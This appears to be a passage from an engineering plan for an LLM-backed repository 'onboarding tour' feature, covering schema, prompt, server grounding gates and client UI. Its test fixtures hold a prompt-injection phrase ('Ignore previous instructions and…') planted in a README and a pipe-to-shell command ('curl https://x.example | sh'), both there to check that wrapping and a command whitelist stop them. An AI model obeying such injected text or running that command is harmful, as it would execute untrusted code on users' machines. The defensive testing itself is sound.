- **Governing skill:** `onion-architecture` (`db-no-outward`; the schema is a leaf). **Decision:** a **new** table; the dead `onboarding` table is left exactly where it is. Composite **primary key** `(repo_id, indexed_sha, indexer_version, prompt_version, provider, model)` — six components, **all non-null** (verified: `repo_index_state.lastIndexedSha` and `indexerVersion` are both `notNull`, `schema/repo-intel.ts:39-40`) — which is what lets this table use a plain PK and a **native `onConflictDoUpdate`**, unlike `pr_brief_records` (`server/INSIGHTS.md:319-332`). `repo_id` carries `references(() => repos.id, { onDelete: 'cascade' })`. Columns: `sections jsonb`, `degraded boolean`, `error text`, `skeleton_sections jsonb`, `dropped_inputs jsonb`, `dropped_refs integer`, `dropped_steps integer`, `index_status text`, `files_skipped integer`, `trace jsonb`, `generated_at timestamptz`. The R15 numbers live inside `trace` rather than as seven flat columns because they are read together and never queried individually — except `budget_tokens` vs `tokens_in`, which J1 reads with `trace->>'budget_tokens'`, a supported jsonb path. **The migration is generated, never hand-written.** Add-only on a new table is one clean pass; the two-generate rule applies only when one table both adds and drops columns.
- **Gate:** `cd server && pnpm db:generate` (must emit **exactly one** `.sql` and must not prompt) · `cd server && pnpm db:migrate` · `pnpm typecheck` · `pnpm arch`
- **Done when:** `\d onboarding_tours` shows the six-column composite PK; the migration file is generated; the dead `onboarding` table is untouched; `pnpm arch` reports 10.
- **Depends on:** T1.
- **Commit:** `feat(tour): onboarding_tours, keyed by the repo-state tuple`

### Phase T4 — The system prompt

- **What lands:** `onboarding.system.md` describes the five sections this spec builds, asks for **annotations keyed by server ids only**, and no longer asks the model for a diagram, a section list or an order. (**R2, R6, R7, R16, R19, R23; spec Traps 4 and 6**)
- **Tasks:**
  - **T4.1** — delete `routes_and_apis` from `:8` and its formatting rules at `:23-26`. → **A14** (five sections, no sixth)
  - **T4.2** — invert `:27`: the model **never** emits `diagram`; that field is written by the server. → **A21**
  - **T4.3** — feed `{{sections}}` the five agreed kinds with a one-line description each, and phrase *Critical paths* as **"the chains that most of the code depends on"** — explicitly **not** "how a request reaches the database" (spec Trap 4, `:451-457`: the index is JS/TS-only and knows nothing about SQL, HTTP clients or layers, so the second phrasing invites a lie no grounding gate can catch). → **A2**
  - **T4.4** — state the one-object, five-nullable-key response shape and that **every list is keyed by a server-supplied id** (`path`, `chain_id`, `candidate_id`); an id not supplied is dropped; order is never expressed. → **A4, A24, C16, C17**
  - **T4.5** — keep the SECURITY paragraph (`:11-12`) **verbatim**, the grounding rules (`:14-18`) and the mermaid rules (`:29-36`) unchanged; keep `{{language}}` at `:42`. → **A15**
- **Files:** `server/src/prompts/onboarding.system.md`
- **Governing skill:** — (a prompt template; `platform/prompts.ts` reads it, nothing imports it)
- **Gate:** `cd server && pnpm typecheck` · `grep -n 'routes_and_apis' server/src/prompts/onboarding.system.md` returns nothing
- **Done when:** the file names exactly the five kinds, contains no `routes_and_apis`, instructs against emitting `diagram`, states the id-keyed annotation contract, and still carries the SECURITY paragraph verbatim.
- **Depends on:** nothing (may run beside T2/T3; ordered here so no track starts against a stale template).
- **Commit:** `feat(tour): rewrite the onboarding system prompt for one id-keyed annotation call`

> **Check in T4, not at J1:** `server/src/platform/prompts.ts:12-14` records that a production `build` must copy `src/prompts` → `dist/prompts`. This template becomes the first one loaded by a **route** rather than an offline path, so a missing copy step is a production-only failure no test catches. ~10 minutes.

---

## Tracks

### Track A — Server: derivation, the skeleton, one grounded call

- **Agent:** `implementer`
- **Owns exclusively:** `server/src/modules/tour/**` · `server/src/modules/index.ts` · `server/src/adapters/tokenizer/index.ts` (doc comment only) · `server/test/tour-*.test.ts` · `server/test/tour.it.test.ts`
- **May read (never import):** `server/src/modules/brief/**`, `server/src/modules/blast/**`, `server/src/modules/project-context/**` — **pattern only; any import trips `no-cross-module-internals`**. Plus `server/src/platform/**`, `server/src/vendor/shared/**`, `reviewer-core/src/prompt.ts`.
- **Governing skill:** `onion-architecture`
- **Depends on:** T1, T2, T3, T4

#### Phase A1 — The wire: module, route pair, cache read, rate limit

- **What lands:** `GET /repos/:id/tour` returns `200 null` for a repo with no tour; `POST` returns `200` with a persisted record; the 6th POST in a minute is `429`; an unindexed repo is refused in rendered form with **zero rows written**; the module is registered.
- **Tasks:**
  - **A1.1** — `modules/tour/{routes,service,repository,constants}.ts` and the registry entry in `server/src/modules/index.ts`. → **A19**
  - **A1.2** — `GET` returns `TourRecord.nullable()`; `POST` parses `{force?}`. → **A13** (the client's `null` contract)
  - **A1.3** — `rateLimit: { max: 5, timeWindow: '1 minute' }`. → **A19**
  - **A1.4** — R18/C1 in the service, before anything else: `getIndexState(repoId)` with no row or `status: 'failed'` → a record-shaped refusal, **no model call, no persisted row**. → **A12** (server half)
  - **A1.5** — `tour.it.test.ts` first cases: rate limit **on its own Fastify instance**, `200 null`, C1. → **A19, A12**
- **Files:** `server/src/modules/tour/{routes,service,repository,constants}.ts` · `server/src/modules/index.ts` · `server/test/tour.it.test.ts`
- **Governing skill:** `onion-architecture`. **Decision: the module earns a service** — it composes a repository with three adapters (`tokenizer`, `llm`, `codeIndex`), one port (`git`) and one facade (`repoIntel`), and applies rules (budget dropping, four grounding gates, a difficulty rubric, an annotation merge) that are not shape validation. Same test `BriefService` and `BlastService` pass. `routes.ts` is the **only** file naming a status code or the rate limit (`routes-no-db`). Logging is `new RunLogger(container.runBus, [], req.log, { repoId })` in the route, fanned over zero runIds — the recorded pattern for a standalone spend (`brief/routes.ts:48-52`). **No transaction and no new container getter:** generation is a single upsert and every input is already on the container. **Registration lands in this phase, not the last one** — `INSIGHTS.md:395+` names `modules/index.ts` as precisely the file whose absence makes a complete-looking feature 404 when rebuilt alone.
- **Gate:** `cd server && pnpm exec vitest run --reporter=dot --exclude '**/*.it.test.ts' test/routes-smoke.test.ts 2>&1 | tail -n 20` · `cd server && pnpm exec vitest run --reporter=dot test/tour.it.test.ts 2>&1 | tail -n 30` · `pnpm arch` · `pnpm typecheck`
- **Done when:** **A19** passes in its own app instance (a shared one leaks rate-limit state — `specs/10-pr-brief.md` A18's lesson); `GET` on a tourless repo is `200 null`, not 404; **C1** writes zero rows and makes zero model calls; `pnpm arch` reports 10.
- **Depends on:** T3.
- **Commit:** `feat(tour): GET/POST /repos/:id/tour, rate-limited, index-gated`

#### Phase A2 — Derivation and **the skeleton** — the thing the whole render is built from

- **What lands:** a pure layer that turns a repo id into a **complete, renderable `TourRecord`** — every section populated with derived facts, every `body`/`why`/`note` `null` — with **no model call made anywhere in this phase**. This is R24, and it is the base case, not an error path.
- **Tasks:**
  - **A2.1** `derive/tree.ts` (R2, Q7) — group `getIndexedFiles` paths by directory prefix to depth 3, folding deeper directories into their depth-3 ancestor's count and naming them in the ancestor's note; role mix from `classifyPath` in `_shared/file-roles.ts`; top-ranked file per directory from `getFileRank`. Cap **200 directories**. → **A9**
  - **A2.2** `derive/diagram.ts` (R2, C4, C10) — render the mermaid string **in code** from `getFileEdges` aggregated to directory pairs. `flowchart LR`, every node label quoted, CR/LF and backticks stripped per `onboarding.system.md:29-36`. Returns **`null`** — never `''`, never a placeholder — when there are no edges. One node when there is one directory. → **A9, A21**
  - **A2.3** `derive/chains.ts` (R3, C5) — `getCriticalPaths(repoId)` → `string[][]`, assigned stable `chain_id`s, joined against `getFileFacts` for endpoints and crons. The facade returns paths only; the annotation is this file's work. `[]` in → `empty_reason`, never an empty card. → **A9, A23**
  - **A2.4** `derive/config.ts` (R4, R5, C6) — `package.json` `scripts`/`packageManager`/`engines`, lockfile name, `.env.example`/`.env.sample` variable **names only**, `docker-compose*.yml` service names, `Dockerfile` presence — each via `container.git.readFile`, **each in its own try/catch**, because `SimpleGitClient.readFile` is a bare `fs.readFile` and **throws ENOENT** (`simple-git.ts:128-130`). A thrown read is an absent fact, not a failure. Emits **R5's whitelist as a value**: `<pm> <script>` per declared script, `<pm> install`, `docker compose up -d <service…>`, `cp .env.example .env`, nothing else. **No `.env`/`.env.local` is ever opened.** → **A3, A16, A23**
  - **A2.5** `derive/reading.ts` (R6, C17) — `getTopFilesByRank(repoId, n, { exclude })` intersected with the chain heads, **emitted in descending rank order**, each entry carrying `rank_percentile`. Note `exclude` is a **substring** match (`service.ts:659`), not a path match. → **A24**
  - **A2.6** `derive/candidates.ts` (R8) — four generators, ≤ 12 candidates, each with `candidate_id`, kind, scope, line, snippet ≤ 120 chars. `missing_test` = a `core`-role file with no matching test. `todo_marker` = `container.codeIndex.grep(repo, 'TODO|FIXME|HACK')` **in a try/catch with its own timeout** — a throw or expiry yields zero from *this* generator and the other three still run. `unresolved_reference` = `getUnresolvedReferences(repoId, files)` fed the **top-ranked list**, because it re-parses the clone per file (`service.ts:585-634`). `undocumented_endpoint` = a `file_facts.endpoints` entry whose file is named in no discovered document (`_shared/doc-discovery.ts`). → **A4, A23**
  - **A2.7** `derive/difficulty.ts` (R9) — pure `(C, P) → TourDifficulty + basis`. `low` when `C ≤ 2 && P < 50`; `high` when `C > 15 || P ≥ 90`; `medium` otherwise; `low` + `signal: 'no_index_signal'` with no `file_rank` row. `C` is the distinct caller-file count from `container.repoIntel.getBlastRadius(repoId, [scope])` — **the facade, which takes an arbitrary file list**, never `modules/blast`, which takes a PR (`blast/service.ts:27`) and whose import trips `no-cross-module-internals`. → **A5**
  - **A2.8** `derive/skeleton.ts` (**R24**) — assemble A2.1–A2.7 into a complete `TourRecord` with all prose `null`, `skeleton_sections` listing all five kinds, run steps emitted **as the whitelist itself** in the fixed order `install → cp .env.example .env → docker compose up -d … → <pm> dev`, and up to 6 candidates under derived titles sorted by difficulty ascending. → **A9, A7**
- **Files:** `server/src/modules/tour/derive/{tree,diagram,chains,config,reading,candidates,difficulty,skeleton}.ts` (new, pure) · `server/src/modules/tour/service.ts` (the impure fetch half) · `server/src/modules/tour/constants.ts` · `server/test/{tour-derive,tour-difficulty,tour-reading-order,tour-skeleton}.test.ts`
- **Governing skill:** `onion-architecture`. **Decision: fetch in the service, shape in `derive/`.** Every file under `derive/` is a pure function over values — no `Container`, no `Db`, no adapter import — so `helpers-are-pure` holds even under `tsPreCompilationDeps: true`, and each gate is testable without a container. Row types are declared **structurally** (`{ path: string; percentile: number }`, not `typeof t.fileRank.$inferSelect`), the trick `modules/blast/helpers.ts:18-27` uses. **The architectural call that defines this revision:** `skeleton.ts` produces the *complete* record and the success path is `skeleton + annotations merged by id` (A4.4), so there is exactly **one** render path and no `if (failed) return earlyErrorCard`. The tempting shortcut is the thing spec Trap 2 (`:442-445`) says deletes the point of this revision, and no test asserting only `degraded: true` catches it.
- **Gate:** `cd server && pnpm exec vitest run --reporter=dot --exclude '**/*.it.test.ts' test/tour-derive.test.ts test/tour-difficulty.test.ts test/tour-reading-order.test.ts test/tour-skeleton.test.ts 2>&1 | tail -n 40` · `pnpm arch` · `pnpm typecheck`
- **Done when:** **A5's rubric half** — table-driven over `(2,49)→low`, `(3,49)→medium`, `(15,89)→medium`, `(16,0)→high`, `(0,90)→high`, no-rank-row → `low`+`no_index_signal`. **A24's skeleton half** — ranks `[0.9,0.5,0.2]` emit in that order with no model involved. **A9's derivation half** — `buildSkeleton` on a fixture returns non-empty `tree`, non-null `diagram`, non-empty `paths`, non-empty `reading`, non-empty `run_steps`, non-empty `tasks`, and **every** `body`/`why`/`note` `null`. **C2** one directory / three files: one-node diagram, ≤ 1 chain, three reading entries, no section hidden. **C3** zero `.ts/.js` files: tree from the walk alone, `diagram: null`, `empty_reason` on chains and reading, config and `todo_marker` still yield. **C4** empty `file_edges` with files present → `diagram === null`, asserted strictly. **C6** no `package.json`/compose/Dockerfile → an **empty** whitelist, tested with a `GitClient` subclass that **throws** for unknown paths, not the base `MockGitClient`, whose `readFile` returns `''` and would exercise the found-but-empty branch (`server/INSIGHTS.md:333-344`). **C10** a directory name with a newline produces a quoted, single-line mermaid label.
- **Depends on:** A1.
- **Commit:** `feat(tour): derive the full skeleton — tree, diagram, chains, whitelist, reading order, candidates, difficulty`

#### Phase A3 — Assembly: wrapped, schema-counted, one 12 000 ceiling

- **What lands:** a pure function producing the exact `{system, user}` pair the one call will receive, measured by `container.tokenizer.count` over `system + user + JSON.stringify(toJsonSchema(schema, name).schema)`, dropping inputs in the *Provenance* order until it fits **12 000** or refusing. **Still no model call**, which is what makes the ceiling assertable hermetically.
- **Tasks:**
  - **A3.1** `assemble.ts` — returns `{ system, user, tokens, droppedInputs }`, taking the tokenizer as an **injected `count: (s: string) => number`** so the file imports nothing from `src/adapters/`. The service sends exactly those two strings. → **A6**
  - **A3.2** the schema addend — `toJsonSchema(schema, schemaName).schema` from `@devdigest/reviewer-core` via `server/src/platform/structured.ts:6-12`: the object the adapter literally puts in `input_schema` (`anthropic.ts:132`) / `json_schema` (`openai.ts:103`). Never `JSON.stringify` of the Zod object. → **A6**
  - **A3.3** drop order (**one table, lowest number first**): **P6** documents → **P11** difficulty inputs → **P8** symbol signatures → **P4** directory edges → **P3** tree (depth 3 before depth 2). **P9 additionally carries the whitelist's own order, which the skeleton uses and the model's response may override (C-1).** **P1, P2, P5, P7, P9, P10 are never dropped** — P5 and P7 are R3/R6/R10's reference sets, P9 is R5's whitelist, P10 is R8's candidate set, and dropping any of them would un-ground a gate rather than shrink an input. Exhausting the droppable list returns `{ ok: false, reason: 'input_over_budget' }`. → **A6, A7**
  - **A3.4** wrapping (R16) — `wrapUntrusted` from `@devdigest/reviewer-core` (`prompt.ts:45-49`). Every path, symbol name, script name **and value**, env-var name, compose service name, TODO text and document body inside a wrapper; instructions, the section list and the output schema outside. No arch rule bars `modules/tour/` → `reviewer-core` (only `smart-diff` is, `.dependency-cruiser.cjs:91-101`) and `modules/brief` already does it. Because this call bypasses `assemblePrompt`, the guard is the template's own SECURITY paragraph (`onboarding.system.md:11-12`), preserved in T4. → **A15**
  - **A3.5** `renderPrompt('onboarding.system.md', { sections, language: 'English' })` — **`{{language}}` supplied** (audit row 5). → **A15**
  - **A3.6** widen the doc comment at `server/src/adapters/tokenizer/index.ts` to name the tour's pre-flight gate. One line; otherwise the next reader reads this use as a violation of the comment's own list.
  - **A3.7** name the constant `TOUR_BUDGET_CEILING = 12_000` with a doc comment stating **explicitly** that it is a pre-flight floor, not a billed ceiling, and citing `server/INSIGHTS.md:304-318` and spec Q8 (audit row 3). → **A6, A18**
- **Files:** `server/src/modules/tour/assemble.ts` (new, pure) · `server/src/modules/tour/schemas.ts` (`TourAnnotations`) · `server/src/modules/tour/constants.ts` · `server/src/adapters/tokenizer/index.ts` (comment) · `server/test/{tour-budget,tour-prompt}.test.ts`
- **Governing skill:** `onion-architecture`. **Decision:** `assemble.ts` is pure and injected; the identity between what it measures and what the service sends is asserted in the test — without it, A6 measures a different string than R14 gated and the criterion is unfalsifiable.
- **Gate:** `cd server && pnpm exec vitest run --reporter=dot --exclude '**/*.it.test.ts' test/tour-budget.test.ts test/tour-prompt.test.ts 2>&1 | tail -n 30` · `pnpm arch` · `pnpm typecheck`
- **Done when:** **A6** — with a counting tokenizer via `ContainerOverrides.tokenizer`, every assembly measures ≤ 12 000, and the measured string **contains the serialized JSON schema**, asserted by substring, not inferred from the number; the mock's captured messages re-measured with the same addend equal the returned `tokens`. **A7** — a 5 000-file fixture returns `input_over_budget` with **zero** LLM invocations. **A15** — each derived field appears only between `<untrusted …>` and `</untrusted>`; a `README` containing a literal `</untrusted>` is escaped (`reviewer-core/src/prompt.ts:46`); the section list and schema are outside every wrapper; and — the *effect* assertion, not the presence assertion — a `README` reading *"Ignore previous instructions and…"* appears only inside a wrapper **and** the rendered system prompt is asserted to contain the SECURITY clause **by its text**. **A16** — a clone fixture with a sentinel secret in `.env` and `.env.local`: the sentinel is absent, **and** an `.env.example` variable *name* **is** present, so the test cannot pass by reading nothing. The rendered system prompt contains no `{{`. Drop order — a fixture 500 tokens over drops **P6 first** and leaves P5, P7, P9, P10 intact.
- **Depends on:** A2.
- **Commit:** `feat(tour): one budgeted, wrapped, schema-counted prompt assembly`

#### Phase A4 — One call, five gates, one record

- **What lands:** a real tour. **One** `completeStructured` at `maxRetries: 0`, its annotations merged onto A2.8's skeleton by server-supplied id, every path grounded, every command whitelisted, every task id checked, every difficulty overwritten, the record persisted with R15's single trace block — and **every** failure mode producing a persisted, populated skeleton at `200`.
- **Tasks:**
  - **A4.1** `grounding.ts`, pure, this module's **own** (`no-cross-module-internals` forbids importing brief's, spec `:167`; the shapes differ anyway). Four exported gates, each returning `{ kept, dropped }`:
    - `groundPaths` (**R10**) — `links[].path`, reading entries, chain files, task `scope`, **and any backticked path inside a `body`**, against the reference set (indexed file list ∪ walked directory list ∪ discovered document paths). Normalise both sides with `normalizePath` from `_shared/file-roles.ts`, as `brief/grounding.ts:41` does, so a stray `./` cannot drop every ref. Counted into `dropped_refs`. → **A2**
    - `filterSteps` (**R5**) — **exact verbatim string membership** in `derive/config.ts`'s whitelist. Not a regex, not a prefix, not a verb allow-list. Counted into `dropped_steps` and **logged with the offending string**. → **A3**
    - `filterAnnotations` (**R8, C16**) — an annotation keyed to a `chain_id`, `path` or `candidate_id` not supplied is dropped and counted; the derived item still renders, skeleton-style. The model may rewrite a task `title`; it may not add one. → **A4**
    - `applyDifficulty` (**R9**) — overwrite unconditionally from `derive/difficulty.ts` and persist `C`, `P` and the basis. Structurally reinforced by `TourAnnotations` having **no `difficulty` field** (T1). → **A5**
  - **A4.2** the call — `resolveFeatureModel(container, workspaceId, 'onboarding')` **before** the cache lookup (provider and model are two of the six key components), wrapped in `withFeatureProviderContext({ id: 'onboarding', label: 'Onboarding Tour', provider, model })`; **exactly one** `completeStructured` with `maxRetries: 0`, `timeoutMs: 45_000`, `maxTokens: 2600`. → **A8**
  - **A4.3** failure → skeleton (**R17, R24, C13, C15**). Catch, in one place: `ConfigError` from a missing key (audit row 6 — the helper's actionable message becomes `error`), a timeout, a transport error, an unparseable or schema-invalid response, a truncation. **A truncated or invalid response is a total parse failure, never trusted field-by-field** (C15) — `error: 'malformed_response'`. `input_over_budget` from A3.3 takes the same path without a call. Every one persists A2.8's skeleton with `degraded: true`, all five kinds in `skeleton_sections`, `trace.tokens_in/out/cost_usd` null and `trace.budget_tokens/provider/model/prompt_version` **non-null**. → **A7, A9, A17**
  - **A4.4** `merge.ts`, pure (**R24, C14, C16, C17**) — `skeleton × TourAnnotations → TourRecord`. Per section: a key that is `null`, absent, or keyed to unknown ids leaves that section's derived facts intact, marks `skeleton: true` and adds its kind to `skeleton_sections`. `guided_reading` takes **only** the `why`, matched by `path`, and the **order is the skeleton's** — any order the response implies is discarded. **`how_to_run` is the one section where the order is the model's** (cross-model review C-1): R4 calls it the section written rather than assembled, so on the success path the merge keeps the response's step sequence and its selection, filtered to whitelist membership by `filterSteps`; the fixed `install → cp → compose → dev` order is the **skeleton's only**. Forcing the skeleton order on success is how `docker compose up -d` ends up printed after `<pm> dev`. → **A24, A26, A9**
  - **A4.5** cache (**R12, C19**) — key `(repoId, indexState.lastIndexedSha, indexState.indexerVersion, TOUR_PROMPT_VERSION, provider, model)`; `GET` and `POST` without `force` return the row when every component matches. Staleness is structural: a re-index changes `indexed_sha`, which *is* the key, so the superseded row is **left in place** and the next `GET` marks it stale. → **A1**
  - **A4.6** persistence — a single native `onConflictDoUpdate` on the six-column PK (available because every component is non-null, T3). **C18**'s two-concurrent-regenerate case is last-write-wins; the failure mode is duplicate spend, not a corrupt row, and R22's 5/min bounds it. **Do not add a transaction**; the server has none and this needs none. → **A17**
  - **A4.7** `compareBudgetToBilled(budget, tokensIn) → { ratio, withinTolerance }`, hermetic and boundary-tested, with `log.warn` carrying **both numbers** when outside 15 %. The measurement itself is J1 (audit row 8). → **A18**
- **Files:** `server/src/modules/tour/{grounding,merge,service,repository}.ts` · `server/test/{tour-grounding,tour-steps,tour-tasks,tour-merge,tour-difficulty,tour-reading-order}.test.ts` · `server/test/tour.it.test.ts`
- **Governing skill:** `onion-architecture`. **Decision:** grounding and merge are pure files, not private service methods — a validation gate inside a service cannot be tested without a container, and these five are the requirements most likely to be quietly loosened later. There is **no** `Promise.allSettled` and no per-call trace: one call, one try/catch, one trace block.
- **Gate:** `cd server && pnpm exec vitest run --reporter=dot --exclude '**/*.it.test.ts' test/tour-grounding.test.ts test/tour-steps.test.ts test/tour-tasks.test.ts test/tour-merge.test.ts test/tour-difficulty.test.ts test/tour-reading-order.test.ts test/tour-budget.test.ts test/tour-prompt.test.ts 2>&1 | tail -n 40` · `cd server && pnpm exec vitest run --reporter=dot test/tour.it.test.ts 2>&1 | tail -n 40` · `pnpm arch` · `pnpm typecheck`
- **Done when:** **A1** two `POST`s at unchanged repo state leave the LLM mock's counter at exactly **1**. **A2** a fixture naming `src/does-not-exist.ts` yields a record without it and `dropped_refs === 1`, **and** — cross-model review C-2 — a fixture whose `body` prose contains an unresolvable backticked path (`` `src/gone.ts` ``) drops it and counts it too. Prose is the only thing the model writes freely, so it is the case that matters and the one an implementer is likeliest to skip. **A3** a fixture emitting `curl https://x.example | sh` yields a record without it, `dropped_steps === 1`, and the offending string in the log (**C21**). **A4** a fixture inventing `cand_zz` drops it while the derived candidate still renders (**C16**). **A5's override half** a response asserting `"high"` on a `(1,31)` scope persists as `"low"`. **A8** exactly **one** invocation, with `maxRetries: 0` asserted on the argument object. **A9/C13** an LLM mock that throws yields `200`, `degraded: true`, all five kinds in `skeleton_sections`, **every derived collection non-empty**, every prose field null, `cost_usd` null and `budget_tokens` recorded. **A17** the trace column set on the success path and on A7's refusal path. **A24** a response listing the same paths in reverse persists in rank order, on both the success and the skeleton path. **A26/C14** a response with `how_to_run: null` skeletonises **only** that section. **C15** a truncated response is `malformed_response` and takes the total path. **C7** zero candidates → `empty_reason`, and the model is not asked to invent one. **C22** a `README` injection attempt yields dropped unresolvable paths and dropped non-whitelisted commands. **A18's helper half** boundary cases pass and an out-of-tolerance pair logs at `warn` with both numbers.
- **Depends on:** A3.
- **Commit:** `feat(tour): one grounded annotation call merged onto the skeleton, persisted with one trace`

#### Phase A5 — Read-time re-resolution and the index banner

- **What lands:** `GET` re-checks every stored path against the **current** index and flags the dead ones; a moved `last_indexed_sha` is surfaced; a `partial`/`degraded` index ships `files_skipped`.
- **Tasks:**
  - **A5.1** `resolve.ts`, pure over `(record, currentIndexedPaths)` → the record with per-entry `resolved: boolean`, section counts **excluding** unresolved entries. → **A10** (server half)
  - **A5.2** `GET` returns `current_indexed_sha`, `index_status` and `files_skipped` alongside the record, so the client's stale marker and banner are one request. → **A11, A12**
- **Files:** `server/src/modules/tour/{resolve,service}.ts` · `server/test/tour-resolve.test.ts` · `server/test/tour.it.test.ts` (staleness cases)
- **Governing skill:** `onion-architecture`. **Decision:** re-resolution is pure and runs on **every** `GET` — one `getIndexedFiles` call plus a set-membership pass, which is what keeps the 400 ms warm bound reachable; persisting resolution at write time is exactly what R11 exists to prevent. Counts are computed here, not on the client, so the number and the list cannot disagree.
- **Gate:** `cd server && pnpm exec vitest run --reporter=dot --exclude '**/*.it.test.ts' test/tour-resolve.test.ts 2>&1 | tail -n 20` · `cd server && pnpm exec vitest run --reporter=dot test/tour.it.test.ts 2>&1 | tail -n 40` · `pnpm arch` · `pnpm typecheck`
- **Done when:** **C12** a stored path absent from the current index returns `resolved: false`, is excluded from the section count, and triggers **no** regeneration. **C19** a record persisted under an older sha returns with both its own `indexed_sha` and the current one, and is not discarded. **R18's `partial`** — `index_status` and `files_skipped` are on the response.
- **Depends on:** A4.
- **Commit:** `feat(tour): re-resolve every stored path at read time`

---

### Track B — Client: the tour page

- **Agent:** `implementer`
- **Owns exclusively:** `client/src/app/repos/[repoId]/tour/**` · `client/src/lib/hooks/tour.ts` (new) · `client/src/lib/hooks/index.ts` · `client/src/vendor/ui/nav.ts` · `client/src/components/app-shell/helpers.ts` (+ its test) · `client/messages/en/onboarding.json`
- **May read:** `client/src/vendor/shared/**` (frozen at T1, written by the script) · `client/src/app/repos/[repoId]/context/**` and `conventions/**` (the folder shape to follow) · `client/src/components/mermaid-diagram/**` · `client/src/lib/hooks/repo-intel.ts`
- **Governing skill:** `frontend-ui-architecture`
- **Depends on:** T1 only — **not** on Track A; client tests mock `fetch`.

#### Phase B1 — Route, the vendored nav row, the `activeKeyFor` repoint, hooks, and every non-populated state

- **What lands:** `/repos/:repoId/tour` renders, is reachable from the sidebar, and every state that is not a generated tour is correct: loading, load error, not-indexed, and empty-with-a-CTA.
- **Tasks:**
  - **B1.1** the route and the route-local view folder. → **A14** (shell)
  - **B1.2** `useTour(repoId)` / `useGenerateTour(repoId)` in a **new** `client/src/lib/hooks/tour.ts`, re-exported from `hooks/index.ts` **in this phase**. → **A13**
  - **B1.3** `isError` checked **before** the empty branch — a failed query renders `loadError.title`, not the CTA. This is the exact defect `client/INSIGHTS.md` records. → **A13**
  - **B1.4** not-indexed state from the **existing** `useRepoIntelStatus` (`hooks/repo-intel.ts`) — `status === 'failed'` or no row → the explanation, a *Resync* control wired to the existing `useResyncRepoIntel`, and a **disabled** *Generate*. No new hook. → **A12**
  - **B1.5** **the vendored nav edit (R20).** One entry in `WORKSPACE` at `client/src/vendor/ui/nav.ts:22-27`, beside `context`: `{ key: "onboarding-tour", label: "Onboarding Tour", icon: "Boxes", href: "/repos/:repoId/tour", gKey: "t" }`, using the label already at `client/messages/en/shell.json:19`. → **A22**
  - **B1.6** **in the same phase, remove `client/src/components/app-shell/helpers.ts:29`** (`if (pathname.includes("/onboarding")) return "onboarding-tour";`) and add `if (pathname.includes("/tour")) return "onboarding-tour";`. Without the removal, the add-repository wizard highlights the tour's brand-new row. → **A22**
  - **B1.7** rewrite `client/messages/en/onboarding.json` (R21) — `generate.body:10` names five *different* sections; `sectionCount:4`'s bare `{count}` becomes `{count, number}`. New keys: three difficulty labels, the difficulty-basis phrasing, the stale marker, the not-indexed explanation, the partial-index banner, per-section empty messages, the **skeleton banner and per-section "no summary generated" marker**, the dead-path note, and the Copy label. Q2's CTA copy — *"up to ~12,000 tokens, 30–60s"* — is a key, so revising it is a JSON edit. → **A13, A20, A23, A26**
- **Files:** `client/src/app/repos/[repoId]/tour/page.tsx` · `.../tour/_components/TourView/{TourView.tsx,helpers.ts,constants.ts,styles.ts,index.ts,TourView.test.tsx}` · `client/src/lib/hooks/tour.ts` · `client/src/lib/hooks/index.ts` · `client/src/vendor/ui/nav.ts` · `client/src/components/app-shell/{helpers.ts,helpers.test.ts}` · `client/messages/en/onboarding.json`
- **Governing skill:** `frontend-ui-architecture`. **Decision:** the view is **route-local** — `app/repos/[repoId]/tour/_components/TourView/` — because exactly one route consumes it and the second-route promotion threshold is not met; `ProjectContextView` in the sibling `context/` folder is the shipped precedent. Constants (section order, truncation lengths, the depth-3 label) go in the folder's own `constants.ts`, never inline in JSX. **Data access is a hook**; `tour.ts` is a **new** domain file rather than an append to `core.ts`, because the hooks directory is already split by domain and a tour hook in `core.ts` is the reach that makes `core.ts` the file everything lands in. Query key `["tour", repoId]`; `onSuccess: qc.setQueryData(["tour", repoId], data)`, copying `usePrIntent`. **No toast is added** — `MutationCache.onError` already toasts every failed mutation. **The `nav.ts` edit is the plan's one deliberate exception to `CLAUDE.md`'s *Do not touch* on `**/src/vendor/**`**, precedented by `client/INSIGHTS.md:162-174` (the `context` and SKILLS LAB entries), isolated to this phase so it can be reverted alone, and landing **with** the page per `nav.ts:33-35` (an entry before its screen exists is a nav item that 404s). `useShellCommands` and the `g`-key handler both iterate `NAV`, so the palette row and shortcut come free. **Invoke the skill before creating the folder** — the route-local-vs-promoted call and the `_components` depth are exactly what it governs.
- **Gate:** `cd client && pnpm exec vitest run --reporter=dot TourView helpers 2>&1 | tail -n 20` · `cd client && pnpm typecheck` · `cd client && pnpm lint` (0 errors, ≤ 43 baseline warnings)
- **Done when:** **A12** (`status: 'failed'` → the explanation, a Resync link, `disabled` Generate). **A13** (query resolves `null` → the CTA with token and time estimates; a query *error* renders the error branch, not the CTA). **A20** (every string resolves through `onboarding.*`; the test renders under `NextIntlClientProvider` with a **rethrowing `onError`**, which is what makes "a missing key throws" literally true — `next-intl` otherwise logs and renders the key path). **A22's client half** — `NAV` contains the entry; `activeKeyFor('/repos/x/tour') === 'onboarding-tour'` **and** `activeKeyFor('/onboarding') !== 'onboarding-tour'`, both asserted.
- **Depends on:** T1.
- **Commit:** `feat(tour): the tour route, its nav row, and every non-populated state`

#### Phase B2 — The populated page: rail, five sections, markdown, diagram, skeleton markers

- **What lands:** a record renders in full — the sticky "On this page" rail, the freshness header, the five sections in fixed order — and a skeleton record renders the same page with one banner and per-section markers instead of prose.
- **Tasks:**
  - **B2.1** `SectionShell` — the shared `<button aria-expanded aria-controls>` header (a **real** button, Accessibility NFR), the anchor id, and the empty/skeleton slot. One component per section under `TourView/_components/`, **not** one component with a five-way switch: the payloads share nothing but `title`, and a switch means every section's change re-tests the other four. → **A14**
  - **B2.2** **order is fixed in `constants.ts`**, not read from the record's array order — a model or a partial generation must not be able to reorder the page. → **A14**
  - **B2.3** markdown through the existing `react-markdown` + `remark-gfm` path with **raw HTML disabled**; `body: null` renders no prose block, never an empty one. → **A9, A26**
  - **B2.4** the diagram through `MermaidDiagram` — already validates with a keyword regex **and** `mermaid.parse({suppressErrors:true})` and returns `null` when invalid (`MermaidDiagram.tsx:29-59`), so A21 needs no new defence. `diagram: null` renders **no container at all**. The `<svg>` carries a text alternative naming the directories it shows — a diagram with no fallback *is* the architecture section for a screen-reader user. → **A21**
  - **B2.5** per-section empty states from `empty_reason` — a named message, **not** an empty card and **not** a hidden section; hiding makes a partial tour look complete. → **A23**
  - **B2.6** **the skeleton render (R24, C14).** One `role="status"` banner **at the top**, not per section (the spec's `proposed` UX item, `:297-300`: with one call every gap has the same cause, so four identical inline errors say the same thing four times). Each section in `skeleton_sections` carries a quiet "no summary generated" marker; its derived facts render exactly as always. → **A9, A26**
